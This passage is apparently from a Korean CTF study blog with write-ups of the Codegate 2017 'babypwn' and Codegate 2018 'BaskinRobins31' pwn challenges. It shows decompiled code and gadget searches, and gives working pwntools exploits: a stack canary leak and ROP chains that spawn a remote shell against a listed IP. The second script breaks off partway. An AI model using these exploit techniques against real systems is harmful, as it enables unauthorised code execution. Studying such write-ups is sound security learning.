  Fortified    Fortifiable    FILEPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No    0        1        babypwnpocas@pocas-VirtualBox:~/pwn/Codagate 2017$ </code></pre><p><strong>checksec을 이용해서 보호 기법을 확인해보니, 카나리와, NX Bit가 걸려있는 것을 확인할 수 있습니다.</strong><br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">unsigned</span> <span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> a1, <span class="pl-k">char</span> **a2){  <span class="pl-c1">socklen_t</span> addr_len; <span class="pl-c"><span class="pl-c">//</span> [esp+20h] [ebp-30h]</span>  <span class="pl-k">int</span> optval; <span class="pl-c"><span class="pl-c">//</span> [esp+24h] [ebp-2Ch]</span>  <span class="pl-k">int</span> v5; <span class="pl-c"><span class="pl-c">//</span> [esp+28h] [ebp-28h]</span>  <span class="pl-k">struct</span> sockaddr addr; <span class="pl-c"><span class="pl-c">//</span> [esp+2Ch] [ebp-24h]</span>  <span class="pl-k">struct</span> sockaddr v7; <span class="pl-c"><span class="pl-c">//</span> [esp+3Ch] [ebp-14h]</span>  <span class="pl-k">unsigned</span> <span class="pl-k">int</span> v8; <span class="pl-c"><span class="pl-c">//</span> [esp+4Ch] [ebp-4h]</span><p>  v8 = <span class="pl-c1">__readgsdword</span>(<span class="pl-c1">0x14u</span>);<br>  <span class="pl-k">if</span> ( a1 == <span class="pl-c1">2</span> )<br>    v5 = <span class="pl-c1">atoi</span>(a2[<span class="pl-c1">1</span>]);<br>  <span class="pl-k">else</span><br>    v5 = <span class="pl-c1">8181</span>;<br>  dword_804B1BC = <span class="pl-c1">socket</span>(<span class="pl-c1">2</span>, <span class="pl-c1">1</span>, <span class="pl-c1">0</span>);<br>  <span class="pl-k">if</span> ( dword_804B1BC == -<span class="pl-c1">1</span> )<br>  {<br>    <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">“</span>[!] socket Error!<span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">exit</span>(<span class="pl-c1">1</span>);<br>  }<br>  addr.<span class="pl-smi">sa_family</span> = <span class="pl-c1">2</span>;<br>  *(_WORD *)addr.<span class="pl-smi">sa_data</span> = <span class="pl-c1">htons</span>(v5);<br>  *(_DWORD *)&amp;addr.<span class="pl-smi">sa_data</span>[<span class="pl-c1">2</span>] = <span class="pl-c1">0</span>;<br>  <span class="pl-c1">bzero</span>(&amp;addr.<span class="pl-smi">sa_data</span>[<span class="pl-c1">6</span>], <span class="pl-c1">8u</span>);<br>  optval = <span class="pl-c1">1</span>;<br>  <span class="pl-c1">setsockopt</span>(dword_804B1BC, <span class="pl-c1">1</span>, <span class="pl-c1">2</span>, &amp;optval, <span class="pl-c1">4u</span>);<br>  <span class="pl-k">if</span> ( <span class="pl-c1">bind</span>(dword_804B1BC, &amp;addr, <span class="pl-c1">0x10u</span>) == -<span class="pl-c1">1</span> )<br>  {<br>    <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">“</span>[!] bind Error!<span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">exit</span>(<span class="pl-c1">1</span>);<br>  }<br>  <span class="pl-k">if</span> ( <span class="pl-c1">listen</span>(dword_804B1BC, <span class="pl-c1">1024</span>) == -<span class="pl-c1">1</span> )<br>  {<br>    <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">“</span>[!] listen Error!<span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">exit</span>(<span class="pl-c1">1</span>);<br>  }<br>  <span class="pl-k">while</span> ( <span class="pl-c1">1</span> )<br>  {<br>    <span class="pl-k">while</span> ( <span class="pl-c1">1</span> )<br>    {<br>      addr_len = <span class="pl-c1">16</span>;<br>      fd = <span class="pl-c1">accept</span>(dword_804B1BC, &amp;v7, &amp;addr_len);<br>      <span class="pl-k">if</span> ( fd != -<span class="pl-c1">1</span> )<br>        <span class="pl-k">break</span>;<br>      <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">“</span>[!] accept Error!<span class="pl-pds">“</span></span>);<br>    }<br>    <span class="pl-k">if</span> ( !<span class="pl-c1">fork</span>() )<br>      <span class="pl-k">break</span>;<br>    <span class="pl-c1">close</span>(fd);<br>    <span class="pl-k">while</span> ( <span class="pl-c1">waitpid</span>(-<span class="pl-c1">1</span>, <span class="pl-c1">0</span>, <span class="pl-c1">1</span>) &gt; <span class="pl-c1">0</span> )<br>      ;<br>  }<br>  <span class="pl-c1">sub_8048B87</span>();<br>  <span class="pl-c1">close</span>(dword_804B1BC);<br>  <span class="pl-c1">close</span>(fd);<br>  <span class="pl-k">return</span> <span class="pl-c1">__readgsdword</span>(<span class="pl-c1">0x14u</span>) ^ v8;<br>}</pre></div></p><p><strong>IDA를 이용해 코드로 변환해주었습니다. main 함수를 보면 socket을 이용해서 8181 포트로 서버를 여는 것을 볼 수 있습니다. 2020년 1월쯤에 C 언어로 이용해서 소켓으로 서버 구축한 적이 있기 때문에 바로 알아 챌 수 있었습니다. 소켓을 생성하고 마지막에는 sub_8048B87 함수를 호출하는 것을 볼 수 있습니다.</strong><br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">unsigned</span> <span class="pl-k">int</span> <span class="pl-en">sub_8048A71</span>(){  <span class="pl-k">int</span> v1; <span class="pl-c"><span class="pl-c">//</span> [esp+1Ch] [ebp-3Ch]</span>  <span class="pl-k">char</span> v2; <span class="pl-c"><span class="pl-c">//</span> [esp+24h] [ebp-34h]</span>  <span class="pl-k">unsigned</span> <span class="pl-k">int</span> v3; <span class="pl-c"><span class="pl-c">//</span> [esp+4Ch] [ebp-Ch]</span><p>  v3 = <span class="pl-c1">__readgsdword</span>(<span class="pl-c1">0x14u</span>);<br>  <span class="pl-c1">memset</span>(&amp;v2, <span class="pl-c1">0</span>, <span class="pl-c1">0x28u</span>);<br>  <span class="pl-k">while</span> ( <span class="pl-c1">1</span> )<br>  {<br>    <span class="pl-k">while</span> ( <span class="pl-c1">1</span> )<br>    {<br>      <span class="pl-k">while</span> ( <span class="pl-c1">1</span> )<br>      {<br>        <span class="pl-c1">sub_80488B1</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>===============================<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>        <span class="pl-c1">sub_80488B1</span>(<span class="pl-s"><span class="pl-pds">“</span>1. Echo<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>        <span class="pl-c1">sub_80488B1</span>(<span class="pl-s"><span class="pl-pds">“</span>2. Reverse Echo<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>        <span class="pl-c1">sub_80488B1</span>(<span class="pl-s"><span class="pl-pds">“</span>3. Exit<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>        <span class="pl-c1">sub_80488B1</span>(<span class="pl-s"><span class="pl-pds">“</span>===============================<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>        v1 = <span class="pl-c1">sub_804895A</span>();<br>        <span class="pl-k">if</span> ( v1 != <span class="pl-c1">1</span> )<br>          <span class="pl-k">break</span>;<br>        <span class="pl-c1">sub_80488B1</span>(<span class="pl-s"><span class="pl-pds">“</span>Input Your Message : <span class="pl-pds">“</span></span>);<br>        <span class="pl-c1">sub_8048907</span>(&amp;v2, <span class="pl-c1">100</span>);<br>        <span class="pl-c1">sub_80488B1</span>(&amp;v2);<br>      }<br>      <span class="pl-k">if</span> ( v1 != <span class="pl-c1">2</span> )<br>        <span class="pl-k">break</span>;<br>      <span class="pl-c1">sub_80488B1</span>(<span class="pl-s"><span class="pl-pds">“</span>Input Your Message : <span class="pl-pds">“</span></span>);<br>      <span class="pl-c1">sub_8048907</span>(&amp;v2, <span class="pl-c1">100</span>);<br>      <span class="pl-c1">sub_80489C8</span>(&amp;v2);<br>      <span class="pl-c1">sub_80488B1</span>(&amp;v2);<br>    }<br>    <span class="pl-k">if</span> ( v1 == <span class="pl-c1">3</span> )<br>      <span class="pl-k">break</span>;<br>    <span class="pl-c1">sub_80488B1</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-cce">\n</span>[!] Wrong Input<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>  }<br>  <span class="pl-k">return</span> <span class="pl-c1">__readgsdword</span>(<span class="pl-c1">0x14u</span>) ^ v3;<br>}</pre></div></p><p><strong>sub_8048A71 함수를 보면 v1, v2, v3 변수를 정의하는 것을 볼 수 있고, v3은 카나리입니다. 하지만 1번 메뉴와 2번 메뉴를 확인해보면 v2의 크기는 40인데 100만큼 입력 받기 때문에 BOF 취약점이 발생합니다. NX Bit가 걸려 있기 때문에 BOF 취약점을 이용해서 ROP를 해주면 될 거 같고, 카나리가 걸려 있기 때문에 카나리부터 릭을 해야합니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"127.0.0.1"</span>, <span class="pl-c1">8181</span>)<p><span class="pl-c"># Canary Leak</span><br><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“&gt; “</span>,<span class="pl-s">“1”</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">sendafter</span>(<span class="pl-s">“: “</span>, <span class="pl-s">“a”</span> <span class="pl-c1">*</span> <span class="pl-c1">41</span>)<br><span class="pl-s1">canary</span> <span class="pl-c1">=</span> <span class="pl-en">u32</span>(<span class="pl-s">“<span class="pl-cce">\x00</span>“</span> <span class="pl-c1">+</span> <span class="pl-s1">p</span>.<span class="pl-en">recv</span>(<span class="pl-c1">1024</span>)[<span class="pl-c1">41</span>:<span class="pl-c1">44</span>])</p><p><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">“Canary : {}”</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">canary</span>)))</pre></div></p><p><strong>Canary는 위와 같이 릭을 할 수 있습니다. v2의 값으로 <code>"a"</code>를 40개 주게 되면 v2 변수가 꽉차 v3 변수와 이어지게 됩니다. 하지만 v2를 꽉 채워주지 않으면 남은 메모리에 Null 값이 삽입되기 때문에 Canary를 릭할 수 없습니다. 하지만 40개를 다 채워줬는데 Canary가 출력 되지 않는데 이는 Canary에 시작도 Null로 시작하기 때문입니다. 그래서 <code>"a"</code>를 41개를 줘 Canary에 시작인 Null 값도 덮으면 Canary 전체를 릭할 수 있습니다.(Null 값이 존재하면 더 이상 읽지 않음)</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ objdump -h babypwn <p>babypwn:     file format elf32-i386</p><p>Sections:<br>Idx Name          Size      VMA       LMA       File off  Algn</p><p>(생략)<br> 24 .bss          0000000c  0804b1b4  0804b1b4  000021b4  2**2<br>                  ALLOC<br>(생략)<br></code></pre></p><p><strong>objdump를 이용해 bss를 구했습니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ gdb -q ./babypwnReading symbols from ./babypwn...(no debugging symbols found)...done.gdb-peda$ p system$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x8048620 &lt;system@plt&gt;gdb-peda$ </code></pre><p><strong>그리고 해당 파일에 system 함수가 존재하기 때문에 libc를 따로 구하지 않아도 될 거 같습니다. 이제 Canary를 릭하고, system 함수가 존재하는 것을 알았기 때문에 ROP를 해보겠습니다.</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>카나리를 릭한다 (Null 값 조심).</li><li>recv 함수를 이용해서 bss에 Command를 넣어준다. (bss에 값을 넣어줄 수 있는 함수가 recv 함수뿐이 없다)</li><li>system 함수의 인자로 bss를 넘겨준다. bss에는 <code>/bin/sh &lt;&amp;4 &gt;&amp;0</code>가 들어있다. <br></li></ol><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><p><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">“141.164.52.207”</span>, <span class="pl-c1">8181</span>)<br><span class="pl-v">E</span> <span class="pl-c1">=</span> <span class="pl-v">ELF</span>(<span class="pl-s">“./babypwn”</span>)</p><p><span class="pl-c"># Canary Leak</span><br><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“&gt; “</span>,<span class="pl-s">“1”</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">sendafter</span>(<span class="pl-s">“: “</span>, <span class="pl-s">“a”</span> <span class="pl-c1">*</span> <span class="pl-c1">41</span>)<br><span class="pl-s1">canary</span> <span class="pl-c1">=</span> <span class="pl-en">u32</span>(<span class="pl-s">“<span class="pl-cce">\x00</span>“</span> <span class="pl-c1">+</span> <span class="pl-s1">p</span>.<span class="pl-en">recv</span>(<span class="pl-c1">1024</span>)[<span class="pl-c1">41</span>:<span class="pl-c1">44</span>])</p><p><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">“Canary : {}”</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">canary</span>)))</p><p><span class="pl-s1">ppppr</span> <span class="pl-c1">=</span> <span class="pl-c1">0x8048eec</span><br><span class="pl-s1">bss</span> <span class="pl-c1">=</span> <span class="pl-v">E</span>.<span class="pl-en">bss</span>()<br><span class="pl-s1">system_plt</span> <span class="pl-c1">=</span> <span class="pl-v">E</span>.<span class="pl-s1">plt</span>[<span class="pl-s">‘system’</span>]<br><span class="pl-s1">recv_plt</span> <span class="pl-c1">=</span> <span class="pl-v">E</span>.<span class="pl-s1">plt</span>[<span class="pl-s">‘recv’</span>]</p><p><span class="pl-s1">command</span> <span class="pl-c1">=</span> <span class="pl-s">“/bin/sh &lt;&amp;4 &gt;&amp;0”</span><br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">“bss : {}”</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">bss</span>)))</p><p><span class="pl-s1">p</span>.<span class="pl-en">close</span>()</p><p><span class="pl-c"># ROP Exploitation</span><br><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">“141.164.52.207”</span>, <span class="pl-c1">8181</span>)</p><p><span class="pl-c"># ROP Channing</span><br><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“a”</span> <span class="pl-c1"><em></span> <span class="pl-c1">40</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">canary</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">“a”</span> <span class="pl-c1"></em></span> <span class="pl-c1">12</span> <span class="pl-c"># Dummy[8] + SFP[4]</span></p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">recv_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">ppppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">4</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">bss</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-en">len</span>(<span class="pl-s1">command</span>)<span class="pl-c1">+</span><span class="pl-c1">1</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0</span>)</p><p><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">system_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-s">“a”</span> <span class="pl-c1">*</span> <span class="pl-c1">4</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">bss</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“&gt; “</span>, <span class="pl-s">“1”</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“: “</span>, <span class="pl-s1">payload</span>)</p><p><span class="pl-c"># Exit -&gt; RET </span><br><span class="pl-s1">p</span>.<span class="pl-en">sendlineafter</span>(<span class="pl-s">“&gt; “</span>, <span class="pl-s">“3”</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">command</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ python exploit.py [+] Opening connection to 141.164.52.207 on port 8181: Done[*] '/home/pocas/pwn/Codagate 2017/babypwn'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)[*] Canary : 0x72c6c200[*] bss : 0x804b1b4[*] Closed connection to 141.164.52.207 port 8181[+] Opening connection to 141.164.52.207 on port 8181: Done[*] Switching to interactive mode$ cat flagFLAG&#123;GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^&#125;$  </code></pre><blockquote><p>FLAG : FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}</p></blockquote><hr><h2><a id="user-content-pwn-d4-20210128" class="anchor" aria-hidden="true" href="#pwn-d4-20210128"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>PWN D+4 (2021.01.28)<br></h2><hr><p>Codagate 2018 Challenge : BaskinRobins31</p><p><strong>오늘은 64 Bit ROP 익스를 공부하고, 좀 쉬운 문제가 없나 보다가 코게 2018에서 나온 BaskinRobins31라는 문제가 있어 풀어보겠습니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ checksec --file=BaskinRobins31RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable    FILEPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols      No    0        3        BaskinRobins31pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ </code></pre><p><strong>checksef을 이용해서 보호 기법을 확인해보니 RELRO와 NX Bit가 걸려있는 것을 볼 수 있습니다. NX Bit를 우회하기 위해 ROP를 이용해 익스를 진행하면 될 거 같고, Partial RELRO이기 때문에 GOT Overwrite가 가능합니다.</strong><br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp){  <span class="pl-k">unsigned</span> <span class="pl-k">int</span> v3; <span class="pl-c"><span class="pl-c">//</span> eax</span>  <span class="pl-k">unsigned</span> <span class="pl-k">int</span> v5; <span class="pl-c"><span class="pl-c">//</span> [rsp+8h] [rbp-8h]</span>  _BOOL4 v6; <span class="pl-c"><span class="pl-c">//</span> [rsp+Ch] [rbp-4h]</span><p>  <span class="pl-c1">setvbuf</span>(stdout, <span class="pl-c1">0LL</span>, <span class="pl-c1">2</span>, <span class="pl-c1">0LL</span>);<br>  <span class="pl-c1">setvbuf</span>(stdin, <span class="pl-c1">0LL</span>, <span class="pl-c1">2</span>, <span class="pl-c1">0LL</span>);<br>  v3 = <span class="pl-c1">time</span>(<span class="pl-c1">0LL</span>);<br>  <span class="pl-c1">srand</span>(v3);<br>  v5 = <span class="pl-c1">31</span>;<br>  v6 = <span class="pl-c1">0</span>;<br>  <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>### This game is similar to the BaskinRobins31 game. ###<span class="pl-pds">“</span></span>);<br>  <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>### The one that take the last match win ###<span class="pl-pds">“</span></span>);<br>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>There are <span class="pl-c1">%u</span> number(s)<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>, <span class="pl-c1">31LL</span>);<br>  <span class="pl-k">while</span> ( (<span class="pl-k">signed</span> <span class="pl-k">int</span>)v5 &gt; <span class="pl-c1">0</span> )<br>  {<br>    <span class="pl-k">if</span> ( v6 )<br>    {<br>      <span class="pl-c1">my_turn</span>(&amp;v5);<br>      v6 = <span class="pl-c1">0</span>;<br>    }<br>    <span class="pl-k">else</span><br>    {<br>      v6 = (<span class="pl-k">unsigned</span> __int64)<span class="pl-c1">your_turn</span>(&amp;v5) != <span class="pl-c1">0</span>;<br>    }<br>    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>remaining number(s) : <span class="pl-c1">%i</span> <span class="pl-cce">\n</span><span class="pl-pds">“</span></span>, v5);<br>  }<br>  <span class="pl-k">if</span> ( v6 )<br>  {<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>Wow! You win!<span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>Hint is : ROP<span class="pl-pds">“</span></span>);<br>  }<br>  <span class="pl-k">else</span><br>  {<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>You lose!<span class="pl-pds">“</span></span>);<br>  }<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</pre></div></p><p><strong>코드를 보면 while 문 안에 v6의 값이 참이 아니면 else 문으로 들어가 your_turn 함수를 호출하는 것을 볼 수 있습니다.</strong><br></p><div class="highlight highlight-source-c"><pre><span class="pl-k">signed</span> __int64 __fastcall <span class="pl-en">your_turn</span>(_DWORD *a1){  <span class="pl-k">signed</span> __int64 result; <span class="pl-c"><span class="pl-c">//</span> rax</span>  <span class="pl-k">char</span> s; <span class="pl-c"><span class="pl-c">//</span> [rsp+10h] [rbp-B0h]</span>  <span class="pl-c1">size_t</span> n; <span class="pl-c"><span class="pl-c">//</span> [rsp+B0h] [rbp-10h]</span>  <span class="pl-k">int</span> v4; <span class="pl-c"><span class="pl-c">//</span> [rsp+BCh] [rbp-4h]</span><p>  v4 = <span class="pl-c1">0</span>;<br>  <span class="pl-c1">memset</span>(&amp;s, <span class="pl-c1">0</span>, 0x96uLL);<br>  <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>How many numbers do you want to take ? (1-3)<span class="pl-pds">“</span></span>);<br>  n = <span class="pl-c1">read</span>(<span class="pl-c1">0</span>, &amp;s, 0x190uLL);<br>  <span class="pl-c1">write</span>(<span class="pl-c1">1</span>, &amp;s, n);<br>  <span class="pl-c1">putchar</span>(<span class="pl-c1">10</span>);<br>  v4 = <span class="pl-c1">strtoul</span>(&amp;s, <span class="pl-c1">0LL</span>, <span class="pl-c1">10</span>);<br>  <span class="pl-k">if</span> ( (<span class="pl-k">unsigned</span> <span class="pl-k">int</span>)<span class="pl-c1">check_decision</span>((<span class="pl-k">unsigned</span> <span class="pl-k">int</span>)(<span class="pl-k">char</span>)v4, <span class="pl-c1">0LL</span>) )<br>  {<br>    *a1 -= v4;<br>    result = <span class="pl-c1">1LL</span>;<br>  }<br>  <span class="pl-k">else</span><br>  {<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>Don’t break the rules…:( <span class="pl-pds">“</span></span>);<br>    result = <span class="pl-c1">0LL</span>;<br>  }<br>  <span class="pl-k">return</span> result;<br>}</pre></div></p><p><strong>your_turn 함수를 보면 read 함수를 이용해서 s 값을 입력 받고, write 함수를 이용해서 출력해주는 것을 볼 수 있습니다. 하지만 s는 memset 함수를 이용해서 150 사이즈만큼 초기화 시켜주는데 read 함수에서는 400만큼 입력을 받고 있어 BOF 취약점이 발생합니다. RET까지 덮을려면 s[176] + sfp[8]만큼 덮어주면 됩니다. 이제 가젯들을 구해보겠습니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ objdump -d BaskinRobins31 | grep -B4 "ret"(생략)--  400877:    48 89 e5                 mov    %rsp,%rbp  40087a:    5f                       pop    %rdi  40087b:    5e                       pop    %rsi  40087c:    5a                       pop    %rdx  40087d:    c3                       retq     40087e:    90                       nop  40087f:    5d                       pop    %rbp  400880:    c3                       retq   --(생략)</code></pre><p><strong>objdump를 이용해서 가젯을 찾아보니 pop pop pop ret 가젯을 있는 것을 확인할 수 있습니다. 그리고 system 함수에서 사용할 pop ret 가젯도 그냥 pppr 가젯에서 2를 더한 것을 사용하려 했는데 이를 이용하니 잘 되지 않았습니다.</strong><br></p><pre><code>gdb-peda$ ropsearch "pop rdi"Searching for ROP gadget: 'pop rdi' in: binary ranges0x00400bc3 : (b'5fc3')    pop rdi; ret0x0040087a : (b'5f5e5ac3')    pop rdi; pop rsi; pop rdx; retgdb-peda$ </code></pre><p><strong>그래서 ropsearch 명령어를 이용해서 pop rdi; ret 가젯을 찾아서 이를 이용했습니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/codegate/2018/BaskinRobins31$ objdump -h BaskinRobins31 <p>BaskinRobins31:     file format elf64-x86-64</p><p>Sections:<br>Idx Name          Size      VMA               LMA               File off  Algn<br>(생략)<br> 25 .bss          00000020  0000000000602090  0000000000602090  00002088  2**4<br>                  ALLOC<br>(생략)<br></code></pre></p><p><strong>마지막으로 objdump를 이용해서 bss를 구했습니다. 나머지 got/plt/offset은 pwntools를 이용해서 구할 수 있습니다.</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 이용해서 read 주소를 릭하고, 이를 이용해서 libc_base를 구한다.</li><li>read 함수를 이용해서 bss에 쉘을 넣어준다.</li><li>read 함수를 이용해서 read got를 system 함수로 체이닝 해준다.</li><li>read 함수를 호출하고, 이때 인자로는 bss를 넘겨준다. bss에는 <code>/bin/sh</code>가 들어있다.<br></li></ol><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><p><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">process</span>(<span class="pl-s">“./BaskinRobins31”</span>)<br><span class="pl-s1">e</span> <span class="pl-c1">=</span> <span class="pl-v">ELF</span>(<span class="pl-s">“./BaskinRobins31”</span>)<br><span class="pl-s1">libc</span> <span class="pl-c1">=</span> <span class="pl-v">ELF</span>(<span class="pl-s">“/lib/x86_64-linux-gnu/libc-2.27.so”</span>)</p><p><span class="pl-s1">system_offset</span> <span class="pl-c1">=</span> <span class="pl-s1">libc</span>.<span class="pl-s1">symbols</span>[<span class="pl-s">‘system’</span>]<br><span class="pl-s1">read_offset</span> <span class="pl-c1">=</span> <span class="pl-s1">libc</span>.<span class="pl-s1">symbols</span>[<span class="pl-s">‘read’</span>]</p><p><span class="pl-s1">read_plt</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">plt</span>[<span class="pl-s">‘read’</span>]<br><span class="pl-s1">read_got</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">got</span>[<span class="pl-s">‘read’</span>]<br><span class="pl-s1">write_plt</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">plt</span>[<span class="pl-s">‘write’</span>]<br><span class="pl-s1">bss</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-en">bss</span>()<br><span class="pl-s1">pppr</span> <span class="pl-c1">=</span> <span class="pl-c1">0x40087a</span><br><span class="pl-s1">pr</span> <span class="pl-c1">=</span> <span class="pl-c1">0x00400bc3</span></p><p><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘pppr : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">pppr</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘bss : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">bss</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘read_plt : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">read_plt</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘read_got : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">read_got</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘write_plt : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">write_plt</span>)))<br><span class="pl-s1">log</span>.<span class="pl-en">info</span>(<span class="pl-s">‘system_offset : {}’</span>.<span class="pl-en">format</span>(<span class="pl-en">hex</span>(<span class="pl-s1">system_offset</span>)))<br><span 